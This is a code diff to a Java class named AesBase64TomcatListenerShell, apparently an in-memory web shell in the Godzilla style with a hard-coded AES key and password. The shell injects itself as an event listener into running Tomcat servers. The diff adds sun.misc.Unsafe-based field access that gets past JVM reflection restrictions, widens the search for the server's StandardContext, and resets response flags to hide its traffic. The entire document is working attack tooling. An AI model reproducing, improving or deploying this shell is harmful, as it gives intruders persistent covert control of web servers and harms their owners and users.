@@ -1,3 +1,5 @@
+import sun.misc.Unsafe;
+
 import java.io.PrintWriter;
 import java.lang.reflect.*;
 import java.util.*;
@@ -6,6 +8,7 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
     private static boolean initialized = false;
     private static final Object lock = new Object();
     private static Class payloadClass;
+    private static Object unsafe;
     private String key = "3c6e0b8a9c15224a";
     private String password = "pass";
 
@@ -73,7 +76,7 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
     }
 
 
-    public static Object[] getStandardContexts() throws Throwable {
+    public Object[] getStandardContexts() throws Throwable {
         HashSet contexts = new HashSet();
         HashSet blackType = new HashSet();
         blackType.add(int.class.getName());
@@ -94,7 +97,15 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
         blackType.add(Boolean.class.getName());
         blackType.add(String.class.getName());
 
-        Object obj = searchObject("org.apache.catalina.core.StandardContext", Thread.currentThread(), new HashSet(), blackType, 30, 0);
+        Class standardContextClass = loadClasses("org.apache.catalina.core.StandardContext");
+        HashSet blackValues = new HashSet();
+        blackValues.add(System.identityHashCode(blackValues));
+
+        Object obj = searchObject(standardContextClass, Thread.currentThread().getContextClassLoader(), blackValues, blackType, 30, 0);
+        if (obj == null) {
+            obj = searchObject(standardContextClass, Thread.currentThread(), blackValues, blackType, 30, 0);
+        }
+
         if (obj != null) {
             contexts.add(obj);
             try {
@@ -121,7 +132,7 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
         return contexts.toArray();
     }
 
-    public static Object searchObject(String targetClassName, Object object, HashSet blacklist, HashSet blackType, int maxDepth, int currentDepth) throws Throwable {
+    public Object searchObject(Class targetClas, Object object, HashSet blacklist, HashSet blackType, int maxDepth, int currentDepth) throws Throwable {
         currentDepth++;
 
         if (currentDepth >= maxDepth) {
@@ -130,7 +141,7 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
 
         if (object != null) {
 
-            if (targetClassName.equals(object.getClass().getName())) {
+            if (targetClas.isInstance(object)) {
                 return object;
             }
 
@@ -152,24 +163,46 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
                     Field field = fields[i];
 
                     try {
-                        field.setAccessible(true);
                         Class fieldType = field.getType();
                         if (!blackType.contains(fieldType.getName())) {
-                            Object fieldValue = field.get(object);
+                            Object fieldValue = getFieldValue(field, object);
                             if (fieldValue != null) {
                                 Object ret = null;
-                                if (fieldType.isArray()) {
+
+                                if (fieldValue instanceof Map) {
+                                    Set set = ((Map) fieldValue).entrySet();
+                                    Iterator iterator = set.iterator();
+                                    while (iterator.hasNext()) {
+                                        Map.Entry entry = (Map.Entry) iterator.next();
+                                        ret = searchObject(targetClas, entry.getValue(), blacklist, blackType, maxDepth, currentDepth);
+                                        if (ret != null) {
+                                            break;
+                                        }
+                                        ret = searchObject(targetClas, entry.getKey(), blacklist, blackType, maxDepth, currentDepth);
+                                        if (ret != null) {
+                                            break;
+                                        }
+                                    }
+                                } else if (fieldValue instanceof Iterable) {
+                                    Iterator iterator = ((Iterable) fieldValue).iterator();
+                                    while (iterator.hasNext()) {
+                                        ret = searchObject(targetClas, iterator.next(), blacklist, blackType, maxDepth, currentDepth);
+                                        if (ret != null) {
+                                            break;
+                                        }
+                                    }
+                                } else if (fieldType.isArray()) {
                                     if (!blackType.contains(fieldType.getComponentType().getName())) {
                                         int arraySize = Array.getLength(fieldValue);
                                         for (int j = 0; j < arraySize; j++) {
-                                            ret = searchObject(targetClassName, Array.get(fieldValue, j), blacklist, blackType, maxDepth, currentDepth);
+                                            ret = searchObject(targetClas, Array.get(fieldValue, j), blacklist, blackType, maxDepth, currentDepth);
                                             if (ret != null) {
                                                 break;
                                             }
                                         }
                                     }
                                 } else {
-                                    ret = searchObject(targetClassName, fieldValue, blacklist, blackType, maxDepth, currentDepth);
+                                    ret = searchObject(targetClas, fieldValue, blacklist, blackType, maxDepth, currentDepth);
                                 }
                                 if (ret != null) {
                                     return ret;
@@ -220,7 +253,7 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
                 isOk = true;
             } else {
                 try {
-                    Method addApplicationEventListenerMethod = standardContext.getClass().getDeclaredMethod("addApplicationEventListener", Object.class);
+                    Method addApplicationEventListenerMethod = getMethodByClass(standardContext.getClass(), "addApplicationEventListener", Object.class);
                     addApplicationEventListenerMethod.setAccessible(true);
                     addApplicationEventListenerMethod.invoke(standardContext, listener);
                     isOk = true;
@@ -277,10 +310,10 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
             }
         }
 
-        if (method!=null){
+        if (method != null) {
             try {
                 method.setAccessible(true);
-            }catch (Throwable e){
+            } catch (Throwable e) {
 
             }
         }
@@ -288,7 +321,17 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
         return method;
     }
 
-    public static Field getField(Object obj, String fieldName) {
+    public Unsafe getUnsafe() throws Exception {
+        if (unsafe == null) {
+            Class unsafeClass = Class.forName("sun.misc.Unsafe");
+            Field theUnsafe = unsafeClass.getDeclaredField("theUnsafe");
+            theUnsafe.setAccessible(true);
+            unsafe = theUnsafe.get(null);
+        }
+        return (Unsafe) unsafe;
+    }
+
+    public Field getField(Object obj, String fieldName) {
         Class clazz = null;
 
         if (obj == null) {
@@ -317,17 +360,58 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
         return field;
     }
 
-    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
+    public Object getFieldValue(Object obj, String fieldName) throws Exception {
         Field f = null;
         if (obj instanceof Field) {
             f = (Field) obj;
         } else {
             f = getField(obj, fieldName);
         }
+
         if (f != null) {
-            return f.get(obj);
+            return getFieldValue(f, obj);
         }
         return null;
+    }
+
+    public Object getFieldValue(Field field, Object value) throws Exception {
+        try {
+            field.setAccessible(true);
+        } catch (Exception e) {
+            Unsafe unsafe = getUnsafe();
+            if (!field.getType().isPrimitive()) {
+                if (Modifier.isStatic(field.getModifiers())) {
+                    return unsafe.staticFieldBase(field);
+                } else {
+                    return unsafe.getObject(value, unsafe.objectFieldOffset(field));
+                }
+            }
+        }
+        return field.get(value);
+    }
+
+    public void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field f = getField(obj, fieldName);
+        if (f != null) {
+            setFieldValue(f, obj, value);
+        }
+    }
+
+    public void setFieldValue(Field field, Object obj, Object value) throws Exception {
+        try {
+            field.setAccessible(true);
+        } catch (Exception e) {
+            Unsafe unsafe = getUnsafe();
+            if (!field.getType().isPrimitive()) {
+                if (Modifier.isStatic(field.getModifiers())) {
+                    unsafe.putObject(obj.getClass(), unsafe.staticFieldOffset(field), value);
+                } else {
+                    unsafe.putObject(obj, unsafe.objectFieldOffset(field), value);
+                }
+                return;
+            }
+        }
+        field.set(obj, value);
     }
 
     public String getParameter(Object requestObject, String name) {
@@ -349,7 +433,7 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
         }
     }
 
-    public static String md5(String s) {
+    public String md5(String s) {
         String ret = null;
         try {
             java.security.MessageDigest m;
@@ -361,52 +445,36 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
         return ret;
     }
 
-    public static String base64Encode(byte[] bs) throws Exception {
+    public String base64Encode(byte[] bs) throws Exception {
         Class base64;
         String value = null;
         try {
             base64 = Class.forName("java.util.Base64");
             Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
-            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{
-                    byte[].class
-            }).invoke(Encoder, new Object[]{
-                    bs
-            });
+            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
         } catch (Exception e) {
             try {
                 base64 = Class.forName("sun.misc.BASE64Encoder");
                 Object Encoder = base64.newInstance();
-                value = (String) Encoder.getClass().getMethod("encode", new Class[]{
-                        byte[].class
-                }).invoke(Encoder, new Object[]{
-                        bs
-                });
+                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
             } catch (Exception e2) {
             }
         }
         return value;
     }
 
-    public static byte[] base64Decode(String bs) throws Exception {
+    public byte[] base64Decode(String bs) throws Exception {
         Class base64;
         byte[] value = null;
         try {
             base64 = Class.forName("java.util.Base64");
             Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
-            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{
-                    String.class
-            }).invoke(decoder, new Object[]{
-                    bs
-            });
+            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
         } catch (Exception e) {
             try {
                 base64 = Class.forName("sun.misc.BASE64Decoder");
                 Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{
-                        String.class
-                }).invoke(decoder, new Object[]{
-                        bs
-                });
+                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
             } catch (Exception e2) {
             }
         }
@@ -448,6 +516,9 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
                                     printWriter.write(md5.substring(16));
                                     printWriter.flush();
                                     printWriter.close();
+                                    setFieldValue(response, "usingWriter", Boolean.FALSE);
+                                    setFieldValue(response, "usingOutputStream", Boolean.FALSE);
+                                    setFieldValue(response, "committed", Boolean.FALSE);
                                 }
                             }
                         }
@@ -460,4 +531,5 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
 
         }
     }
+
 }
